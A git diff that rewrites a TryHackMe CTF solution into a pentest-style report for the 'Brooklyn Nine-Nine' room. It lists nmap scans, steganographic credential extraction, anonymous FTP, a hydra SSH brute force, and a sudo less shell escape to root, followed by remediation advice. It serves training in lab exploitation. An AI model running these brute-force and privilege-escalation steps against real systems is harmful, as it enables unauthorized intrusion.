@@ -1,50 +1,269 @@
-# BrooklynNineNine - solution
-- Link: https://tryhackme.com/room/brooklynninenine
-- Difficulty: `easy`
+# 📝 Brooklyn Nine-Nine - Pentest Report  
 
-## Host recognition
-- `cd nmap`
--  `nmap --open <IP> -oG scan`
- -  `extractPorts scan` (custom command) to copy open ports
-- `nmap -sCV -p21,22,80 <IP> -oN ports`
+**Platform:** TryHackMe  
+**Difficulty:** Easy  
+**Target OS:** Linux  
+**Assessment Type:** Black-box (no prior credentials)  
+**Author:** Diego Colì  
 
-## Port 80 - website recognition
-- `wget http://<IP>/brooklyn99.jpg` to download the img
-- `stegcracker brooklyn99.jpg` to crack the passphrase
-- `steghide extract -sf brooklyn99.jpg`
-- Extracted credentials, saved them in `/credentials` 
+---
 
-## Port 21 - ftp-anon: anonymous FTP login allowed
-- `cd content`
-- `ftp <IP>` (name: `anonymous`, password: `<Enter>`)
-- Inside the FTP shell:
-  - `get note_to_jake.txt` to download the resource
-  - `cat note_to_jake.txt` 
-  - Found likely users: `amy` `holt` `jake`
+# ☰ 1. Executive Summary
 
-## Port 22 - SSH 
-- `hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<IP>`
-- Cracked `jake`'s SSH password, saved in `/credentials` 
-- `ssh jake@10.10.67.99` (password: `<password`)
-- Inside the SSH shell:
-  - `pwd` (we are into `/jake`)
-  - `cd ..` to come back into `/home` folder
-  - Found `/amy` `/holt` `/jake` folders
-  - `cd holt`
-  - `cat user.txt` 
-    - Found the `USER FLAG`
-  
-## Privileges escalation
-- Inside the SSH shell:
-  - Couldn't access `/root`, so:
-  - `find / -perm -4000 2>/dev/null` to find binaries with the SUID bit set
-  - `sudo -l` to discover which binaries the active user can run as superuser
-  - Found `/usr/bin/less`
-- Checked it on https://gtfobins.github.io and found how to exploit the binary
-- Inside the SSH shell:
-  - `sudo less /etc/profile`
-  - `!/bin/sh`
-  - `whoami` to check if I became the root user 
-  - `cd /root`
-  - `cat root.txt` 
-    - Found the `ROOT FLAG`
+The objective of this assessment was to identify security weaknesses in exposed services and obtain both user-level and root-level access.
+
+The attack chain included:
+- Service enumeration
+- Anonymous FTP access
+- Steganographic credential discovery
+- SSH brute-force attack
+- Privilege escalation via misconfigured sudo permissions
+
+Full administrative (root) compromise was successfully achieved.
+
+**Overall Risk Rating: Critical**
+
+---
+
+# 🛠️ 2. Scope and Methodology
+
+## Scope
+
+- Single Linux target machine
+- No credentials provided
+- External attacker perspective
+
+## Methodology
+
+The following penetration testing phases were performed:
+
+1. Reconnaissance
+2. Service Enumeration
+3. Credential Harvesting
+4. Initial Access
+5. Post-Exploitation Enumeration
+6. Privilege Escalation
+
+## Tools Used
+
+- Nmap
+- Hydra
+- Steghide
+- Stegcracker
+- GTFOBins
+- Native Linux enumeration commands
+
+---
+
+# 🔍 3. Reconnaissance
+
+## 3.1 Port Discovery
+
+Initial scan:
+
+```bash
+nmap --open <TARGET_IP> -oG scan
+```
+
+Service and version detection:
+
+```bash
+nmap -sCV -p21,22,80 <TARGET_IP> -oN ports
+```
+
+### Open Ports Identified
+
+| Port | Service | Version |
+|------|----------|----------|
+| 21   | FTP      | vsftpd |
+| 22   | SSH      | OpenSSH |
+| 80   | HTTP     | Apache |
+
+---
+
+# 🌐 4. Web Enumeration (Port 80)
+
+The web server hosted a publicly accessible image file:
+
+```
+brooklyn99.jpg
+```
+
+## 4.1 Steganography Analysis
+
+Download the image:
+
+```bash
+wget http://<TARGET_IP>/brooklyn99.jpg
+```
+
+Attempt passphrase cracking:
+
+```bash
+stegcracker brooklyn99.jpg
+```
+
+Extract hidden content:
+
+```bash
+steghide extract -sf brooklyn99.jpg
+```
+
+### Findings
+
+Credentials were embedded inside the image file.
+
+### Vulnerability Identified
+
+**Information Disclosure via Steganography**
+
+Sensitive credentials were stored inside a publicly accessible file.
+
+- Severity: Medium  
+- Impact: Credential Exposure  
+
+---
+
+# 🗂️ 5. FTP Enumeration (Port 21)
+
+Anonymous login was permitted.
+
+```bash
+ftp <TARGET_IP>
+Username: anonymous
+Password: <blank>
+```
+
+Retrieved file:
+
+```
+note_to_jake.txt
+```
+
+### Findings
+
+The file disclosed valid system usernames:
+
+- jake
+- amy
+- holt
+
+### Vulnerability Identified
+
+**Anonymous FTP Access Enabled**
+
+Unauthenticated users could download internal files.
+
+- Severity: Medium  
+- Impact: Information Disclosure  
+
+---
+
+# 🔐 6. Initial Access (SSH Exploitation)
+
+Using the discovered username `jake`, a dictionary-based brute-force attack was performed.
+
+```bash
+hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
+```
+
+The password was successfully recovered.
+
+SSH access was obtained:
+
+```bash
+ssh jake@<TARGET_IP>
+```
+
+---
+
+# 🔓 7. Post-Exploitation
+
+After authentication, user directories were enumerated:
+
+```bash
+ls /home
+```
+
+The user flag was found in:
+
+```
+/home/holt/user.txt
+```
+
+---
+
+# 📶 8. Privilege Escalation
+
+## 8.1 Sudo Permissions Enumeration
+
+```bash
+sudo -l
+```
+
+The following binary was executable as root without password:
+
+```
+/usr/bin/less
+```
+
+## 8.2 Exploitation
+
+The binary was verified as exploitable for shell escape.
+
+Exploit:
+
+```bash
+sudo less /etc/profile
+!/bin/sh
+```
+
+Privilege escalation was successful.
+
+Verification:
+
+```bash
+whoami
+```
+
+Output:
+
+```
+root
+```
+
+Root flag retrieved from:
+
+```
+/root/root.txt
+```
+
+---
+
+# 🎯 9. Vulnerability Summary
+
+| Vulnerability | Description | Severity |
+|---------------|------------|----------|
+| Anonymous FTP Access | Unauthenticated file access | Medium |
+| Weak SSH Password | Susceptible to brute force | High |
+| Misconfigured Sudo Permissions | Privilege escalation via `less` | Critical |
+
+---
+
+# ⚠️ 10. Risk Assessment
+
+The combination of exposed services, weak authentication controls, and improper sudo configuration resulted in full system compromise.
+
+The most severe issue was the ability to execute `/usr/bin/less` with root privileges, allowing shell escape and administrative access.
+
+**Overall Risk: Critical**
+
+---
+
+# 🩹 11. Solutions
+
+1. Disable anonymous FTP access.
+2. Enforce strong password policies.
+3. Implement SSH rate limiting (e.g., Fail2Ban).
+4. Apply the principle of least privilege to sudo configurations.
+5. Conduct periodic security audits and configuration reviews.
